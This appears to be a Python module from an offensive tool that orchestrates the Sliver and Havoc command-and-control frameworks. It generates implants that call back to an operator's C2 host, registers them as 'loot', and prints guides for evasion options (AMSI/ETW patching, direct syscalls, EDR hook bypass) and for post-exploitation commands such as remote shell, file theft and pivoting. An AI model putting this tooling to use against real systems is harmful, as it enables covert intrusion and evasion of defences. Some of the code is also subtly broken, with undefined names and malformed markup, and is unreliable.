"""
MSF-COMMANDER v2 — C2 Bridge Module
Integration with Sliver and Havoc C2 frameworks via CLI.

These are LEGITIMATE open-source security tools pre-packaged in Kali Linux.
This module provides orchestration wrappers — it does not build C2 capabilities.
"""

import subprocess
import json
import time
import re
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

TOOLS_DIR = Path(__file__).parent.parent / "tools"


class C2Bridge:
    """
    Orchestration bridge for C2 frameworks.
    Supports Sliver (https://github.com/BishopFox/sliver) and Havoc (https://github.com/HavocFramework/Havoc).
    Both are open-source C2 frameworks included in Kali Linux repositories.
    """

    def __init__(self, db, tm, events):
        self.db = db
        self.tm = tm
        self.events = events

    @staticmethod
    def _run(cmd: str, timeout: int = 120) -> Tuple[str, str, int]:
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            return r.stdout.strip(), r.stderr.strip(), r.returncode
        except subprocess.TimeoutExpired:
            return "", "TIMEOUT", -1
        except Exception as e:
            return "", str(e), -1

    def _check_tool(self, tool: str) -> bool:
        _, _, rc = self._run(f"which {tool}", timeout=5)
        return rc == 0

    # ═══════════════════════════════════════════════════════
    # SLIVER C2
    # ═══════════════════════════════════════════════════════
    def sliver_status(self) -> Dict[str, Any]:
        """Check if Sliver is installed and server status."""
        if not self._check_tool("sliver"):
            return {"installed": False, "note": "Install: sudo apt install sliver (or from GitHub releases)"}

        # Check if server is running
        _, stderr, rc = self._run("sliver version", timeout=10)
        version = stderr or ""
        _, _, rc2 = self._run("sliver-server --help", timeout=5)
        return {
            "installed": True,
            "version": version.strip()[:100],
            "server_available": rc2 == 0,
        }

    def sliver_generate_implant(self, os_: str = "windows", arch: str = "amd64",
                                 format_: str = "exe",
                                 c2_host: str = "", c2_port: int = 443,
                                 protocol: str = "https",
                                 name: str = "",
                                 mtls: bool = True, wg: bool = False,
                                 canary: bool = False,
                                 output_dir: str = "payloads") -> Dict[str, Any]:
        """
        Generate a Sliver implant (beacon/interactive).
        Sliver generates UNIQUE compiled binaries each time — no static msfvenom signatures.

        Args:
            os_: Target OS (windows, linux, macos)
            arch: Architecture (amd64, x86, arm64)
            format_: Output format (exe, sharedlib, shellcode, service)
            c2_host: Your C2 server IP/domain
            c2_port: C2 listener port
            protocol: C2 protocol (https, http, dns, mtls, wg)
            name: Output filename
            mtls: Enable mTLS
            wg: Enable WireGuard
            canary: Enable domain canary
        """
        if not self._check_tool("sliver"):
            return {"success": False, "error": "Sliver not installed. Install with: sudo apt install sliver"}

        from datetime import datetime
        if not name:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            name = f"sliver_{os_}_{arch}_{ts}"
            ext = {"exe": ".exe", "sharedlib": ".dll", "shellcode": ".bin", "service": ".exe"}.get(format_, "")
            name += ext

        output_path = Path(output_dir) / name
        output_path.parent.mkdir(parents=True, exist_ok=True)

        # Build the Sliver command
        cmd_parts = ["sliver", "generate", f"--os {os_}", f"--arch {arch}"]

        if format_ == "sharedlib":
            cmd_parts.append("--format sharedlib")
        elif format_ == "shellcode":
            cmd_parts.append("--format shellcode")
        elif format_ == "service":
            cmd_parts.append("--format service")
        else:
            cmd_parts.append("--format exe")

        if mtls and c2_host:
            cmd_parts.append(f"--mtls {c2_host}:{c2_port}")
        if wg and c2_host:
            cmd_parts.append(f"--wg {c2_host}:{c2_port}")
        if c2_host and not mtls and not wg:
            cmd_parts.append(f"--{protocol} {c2_host}:{c2_port}")

        if canary:
            cmd_parts.append("--canary 1.2.3.4")  # placeholder domain

        cmd_parts.extend(["-o", str(output_path)])
        cmd = " ".join(cmd_parts)

        self.events.emit("info", "c2", "sliver_generate",
                         f"Generating Sliver implant: {os_}/{arch} ({format_})")
        console.print(Panel(
            f"Framework: Sliver\n"
            f"OS: {os_} | Arch: {arch} | Format: {format_}\n"
            f"C2: {protocol}://{c2_host}:{c2_port}\n"
            f"mTLS: {mtls} | WireGuard: {wg}\n"
            f"Output: {output_path}",
            title="[bold cyan]Sliver Implant Generation[/]",
            border_style="cyan"
        ))

        with console.status("[bold cyan]Generating implant (compiling)..."):
            stdout, stderr, rc = self._run(cmd, timeout=300)

        if output_path.exists():
            size = output_path.stat().st_size
            result = {
                "success": True,
                "output_path": str(output_path),
                "size": size,
                "size_human": f"{size / 1024:.1f} KB",
                "os": os_, "arch": arch, "format": format_,
                "c2": f"{protocol}://{c2_host}:{c2_port}",
            }
            self.events.emit("info", "c2", "sliver_complete",
                             f"Implant generated: {output_path} ({result['size_human']})")
            console.print(f"[bold green]Implant saved: {output_path} ({result['size_human']})[/]")
            console.print(f"\n[dim]Next: Start Sliver server → sliver → {name}[/]")

            # Register in loot
            self.tm.add_loot("implant", name, local_path=str(output_path),
                             size=size, description=f"Sliver {os_}/{arch} {format_} implant",
                             tags=["sliver", os_, arch, protocol])
            return result

        return {"success": False, "error": stderr or stdout or "Generation failed"}

    def sliver_list_implants(self) -> Dict[str, Any]:
        """List generated Sliver implants in payloads directory."""
        payloads_dir = Path("payloads")
        if not payloads_dir.exists():
            return {"implants": []}

        implants = []
        for f in payloads_dir.iterdir():
            if f.is_file() and "sliver" in f.name.lower():
                implants.append({
                    "name": f.name,
                    "size": f.stat().st_size,
                    "modified": datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
                })
        return {"implants": sorted(implants, key=lambda x: x["name"])}

    # ═══════════════════════════════════════════════════════
    # HAVOC C2
    # ═══════════════════════════════════════════════════════
    def havoc_status(self) -> Dict[str, Any]:
        """Check if Havoc is installed."""
        # Havoc is typically installed from source, check common paths
        havoc_paths = [
            Path("/opt/Havoc/havoc"),
            Path("/usr/local/bin/havoc"),
            Path.home() / "Havoc/havoc",
        ]
        for p in havoc_paths:
            if p.exists():
                _, stdout, rc = self._run(str(p), timeout=5)
                return {"installed": True, "path": str(p)}

        # Check if teamserver is running
        _, _, rc = self._run("pgrep -f havoc", timeout=5)
        return {
            "installed": rc == 0,
            "note": "Havoc requires manual installation from https://github.com/HavocFramework/Havoc",
        }

    def havoc_generate_implant(self, target_os: str = "windows", arch: str = "x64",
                                output_name: str = "",
                                output_dir: str = "payloads") -> Dict[str, Any]:
        """
        Generate a Havoc Demon implant.

        Note: Havoc implants are generated through the Havoc client GUI or API.
        This helper creates the configuration template and documents the process.

        Havoc generates compiled C implants with BOF (Beacon Object File) support,
        producing unique binaries without static signatures.
        """
        console.print(Panel(
            "[bold yellow]Havoc Implant Generation[/]\n\n"
            "Havoc generates implants through its client interface:\n\n"
            "1. Start Havoc Teamserver: [cyan]sudo ./havoc teamserver --profile profile.yaml[/]\n"
            "2. Start Havoc Client: [cyan]./havoc client[/]\n"
            "3. Connect to teamserver\n"
            "4. Go to: Attacks → Payload Generator\n"
            "5. Select: Demon agent → Configure listener, arch, format\n"
            "6. Generate: EXE, DLL, Shellcode, or Service\n\n"
            "[bold]Why Havoc is better than msfvenom:[/]\n"
            "• Compiled C implants (no static signatures)\n"
            "• BOF (Beacon Object File) support for in-memory execution\n"
            "• Direct syscalls (bypasses userland API hooking)\n"
            "• Sleep obfuscation (encrypts memory while sleeping)\n"
            "• Custom C2 profiles for traffic shaping",
            title="[bold red]Havoc C2[/]",
            border_style="red"
        ))

        self.events.emit("info", "c2", "havoc_guide", "Havoc implant generation guide displayed")
        return {
            "success": True,
            "note": "Use Havoc client GUI for implant generation. See Havoc documentation.",
            "advantages": [
                "Compiled C — unique binary each time",
                "BOF support — in-memory .o file execution",
                "Direct syscalls — bypasses EDR userland hooks",
                "Sleep obfuscation — encrypted memory during beacon sleep",
                "ETW/AMSI patching — built-in evasion techniques",
            ],
        }

    # ═══════════════════════════════════════════════════════
    # C2 COMPARISON & GUIDANCE
    # ═══════════════════════════════════════════════════════
    def compare_c2(self):
        """Display comparison of supported C2 frameworks."""
        table = Table(title="C2 Framework Comparison", box=rich.box.DOUBLE_EDGE)
        table.add_column("Feature", style="bold cyan")
        table.add_column("Sliver", style="green")
        table.add_column("Havoc", style="green")
        table.add_column("Metasploit (Handler)", style="yellow")

        rows = [
            ("Language", "Go", "C + Python", "Ruby + C"),
            ("Implant Type", "Go compiled", "C compiled (Demon)", "Meterpreter (Ruby/C)"),
            ("AV Detection", "Low (unique binary)", "Very Low (C + syscalls)", "High (known signatures)"),
            ("BOF Support", "Yes (.o files)", "Yes (native BOF)", "No"),
            ("Direct Syscalls", "Yes", "Yes", "No"),
            ("Sleep Obfuscation", "Yes", "Yes (built-in)", "No"),
            ("Pivot Support", "SOCKS, TCP relay", "SOCKS, TCP relay", "Route + Socks4a"),
            ("Install (Kali)", "apt install sliver", "Build from source", "Pre-installed"),
            ("License", "GPLv3", "GPLv3", "BSD"),
            ("Best For", "Red team ops", "Advanced evasion", "Learning, labs"),
        ]

        for row in rows:
            table.add_row(*row)
        console.print(table)

        console.print("\n[bold]Recommendation for engagements:[/]")
        console.print("  [green]• Sliver[/] — Best balance of features and ease of use")
        console.print("  [green]• Havoc[/] — Maximum evasion capability")
        console.print("  [yellow]• Metasploit[/] — Exploit modules and post-exploitation only")

    def setup_guide(self, framework: str = "sliver"):
        """Display setup guide for a specific C2 framework."""
        if framework == "sliver":
            guide = """
[bold cyan]Sliver C2 Setup Guide[/]

[bold]1. Installation (Kali):[/]
    sudo apt update && sudo apt install sliver

[bold]2. Start server (multiplayer):[/]
    sliver-server multiplayer

[bold]3. Connect client (new terminal):[/]
    sliver

[bold]4. Generate implant:[/]
    [green]msf-cmd c2 sliver-generate --os windows --arch amd64 --mtls --host YOUR_IP --port 443[/]

[bold]5. Start listener in Sliver:[]
    [green]sliver > mtls[/]

[bold]6. When implant executes, get interactive session:[]
    [green]sliver > use [SESSION_ID][/]
    [green]sliver (SESSION) > info[/]
    [green]sliver (SESSION) > shell[/]
    [green]sliver (SESSION) > execute -o C:\\\\Windows\\\\Temp\\\\payload.exe[/]

[bold]Common Sliver commands:[]
    [cyan]sessions[/]              — List active sessions
    [cyan]use ID[/]                — Interact with session
    [cyan]shell[/]                 — System shell
    [cyan]execute -o PATH[/]      — Run executable
    [cyan]download PATH[/]         — Download file
    [cyan]upload local remote[/]   — Upload file
    [cyan]screenshot[/]            — Capture screen
    [cyan]getprivs[/]              — Show privileges
    [cyan]getuid[/]                — Current user
    [cyan]ps[/]                    — List processes
    [cyan]kill PID[/]              — Kill process
    [cyan]socks 1080[/]            — Start SOCKS proxy
    [cyan]pivot-tcp-listen 4444[/] — TCP relay listener
"""
        elif framework == "havoc":
            guide = """
[bold red]Havoc C2 Setup Guide[/]

[bold]1. Installation (build from source):[/]
    sudo apt install gcc g++ python3 python3-pip make git
    pip3 install pwntools
    git clone https://github.com/HavocFramework/Havoc.git
    cd Havoc && make

[bold]2. Start Teamserver:[/]
    sudo ./teamserver ip [port] [password]

[bold]3. Start Client:[/]
    ./client

[bold]4. In Client → Listeners → Add:[/]
    • Type: HTTP/S or mTLS
    • Host: YOUR_IP, Port: 443

[bold]5. Attacks → Payload Generator:[/]
    • Agent: Demon
    • Listener: (select from step 4)
    • Arch: x64
    • Format: EXE / DLL / Shellcode / Service EXE
    • Enable: Sleep mask, Direct Syscall, AMSI patch, ETW patch

[bold]6. Demon session commands:[/]
    [cyan]shell[/]           — System shell
    [cyan]sleep SECONDS[/]   — Beacon sleep time
    [cyan]inline-execute /path/to/beacon.bin[/] — Load BOF
    [cyan]download PATH[/]   — Download file
    [cyan]upload local remote[/]
    [cyan]screenshot[/]
    [cyan]ps[/]
    [cyan]token whoami /priv[/]
    [cyan]pivot add subnet gateway[/]
"""
        else:
            guide = "[yellow]Available frameworks: sliver, havoc[/]"

        console.print(guide)
        return {"framework": framework, "guide_displayed": True}
